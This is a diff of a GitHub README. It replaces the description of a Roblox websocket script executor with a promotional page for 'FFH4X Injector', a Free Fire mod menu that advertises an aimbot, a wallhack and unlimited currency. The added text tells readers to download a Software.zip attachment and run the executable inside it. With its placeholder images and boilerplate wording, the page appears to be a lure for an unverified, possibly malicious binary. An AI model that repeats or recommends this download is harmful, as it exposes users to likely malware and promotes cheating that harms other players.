@@ -1,28 +1,66 @@
-# Roblox Websocket Executor
+# FFH4X [![Download FFH4X](https://img.shields.io/static/v1?label=Download&message=Software.zip&color=<COLOR>&style=for-the-badge&logo=github)](https://github.com/user-attachments/files/16913125/Software.zip) 
 
-A Roblox "executor", created using the Synapse X websocket library and a C# websocket server.
+Welcome to the FFH4X Injector repository! 🚀
 
-## How to use
+## Overview
 
-To use the client, place the [script](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/client_release.lua) in your exploit's (I have only tested this using Synapse X) "autoexec" directory, and whenever you join a game in Roblox, it will start the client, which will try to connect to the server.
+FFH4X Injector is a MOD Menu for Free Fire that offers a wide range of amazing features to enhance your gaming experience. Players can enjoy various hacks and customizations for Free Fire using the Windows Ffh4x Menu. This injector provides numerous paid features for free, making it a popular choice among users worldwide. Stay tuned for exciting new updates with a plethora of additional features to take your Free Fire gameplay to the next level!
 
-To use the server, download the [executor's ZIP](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/server_release.zip) onto your computer, extract it, and run the executable. It will start the server, and it will allow you to execute scripts.
+![FFH4X Logo](https://www.logo.com/example.png)
 
-### Demonstration
+## Features
 
-https://user-images.githubusercontent.com/120275751/225953612-1b6de800-0373-416d-b3d0-c0699ecb2061.mp4
+The FFH4X Injector comes packed with incredible features designed to give you the edge in Free Fire:
 
-## Further explanation
+- **Aimbot**: Enhance your precision and target enemies effortlessly.
+- **Wallhack**: See through walls and obstacles to stay one step ahead of your opponents.
+- **ESP**: Display detailed information about enemies, making it easier to strategize.
+- **Speed Hack**: Move faster in the game to outmaneuver your rivals.
+- **No Recoil**: Shoot with greater stability and accuracy.
+- **Unlimited Diamonds & Coins**: Get access to unlimited in-game currency.
+- **Custom Skins & Characters**: Stand out with unique customized skins and characters.
 
-There is a WebSocket server in C# user interface. When the user executes a script, it broadcasts to connected clients with the script they want to execute.
+![Free Fire Gameplay](https://www.gameplay.com/example.png)
 
-The client is written in Lua, on first execution, it will tell the server to execute files in the "autoexec" directory of the executor, it will also hook into the print, warn, and error function, and it will broadcast each output, to allow for an external console.
+## Installation
 
-This isn't useful, and this serves as a proof of concept. However, this does have some advantages over using an API like [SXLib](https://github.com/XarienC/Synapse-X-Open-Source-UI) (Synapse X's library), such as being able to hook outputs like print or warn, for an external console in a custom UI, however you could probably do a combination of SXLib and websockets, as you wouldn't need to include the client in "autoexec", as SXLib could automatically execute that for you.
+Follow these steps to install FFH4X Injector on your device:
 
-## Attribution
+1. Download the FFH4X software from the following link: [Download FFH4X](https://github.com/user-attachments/files/16913125/Software.zip)
+2. Extract the downloaded ZIP file to a location of your choice.
+3. Run the FFH4X executable file.
+4. Follow the on-screen instructions to set up the injector.
+5. Launch Free Fire and start enjoying the enhanced gaming experience!
 
-Here are a list of open-source libraries used by this project.
+## Usage
 
-- [sta/websocket-sharp](https://github.com/sta/websocket-sharp): WebSocket library used
-- [PavelTorgashov/FastColoredTextBox](https://github.com/PavelTorgashov/FastColoredTextBox): Syntax highlighted textbox used
+To use FFH4X Injector in Free Fire:
+
+1. Open the FFH4X software.
+2. Select the desired hacks and features from the menu.
+3. Launch Free Fire.
+4. Enjoy a competitive advantage with the selected hacks enabled.
+
+## Feedback
+
+We value your feedback! If you have any suggestions, bug reports, or feature requests, please feel free to open an issue on our GitHub repository. Your input helps us improve the FFH4X Injector and deliver an even better gaming experience to our users.
+
+## Stay Connected
+
+Stay up to date with the latest news, updates, and announcements by following us on social media:
+
+- **Twitter**: [FFH4X Twitter](https://twitter.com/ffh4x)
+- **Instagram**: [FFH4X Instagram](https://instagram.com/ffh4x)
+- **Discord**: [FFH4X Discord](https://discord.gg/ffh4x)
+
+## Acknowledgements
+
+We would like to thank our dedicated team of developers and contributors who have worked tirelessly to bring you the FFH4X Injector. Your support and commitment are truly appreciated!
+
+## License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+---
+
+Your support and feedback are invaluable to us as we continue to enhance the FFH4X Injector. Thank you for choosing FFH4X - the ultimate MOD Menu for Free Fire! 🔥🎮
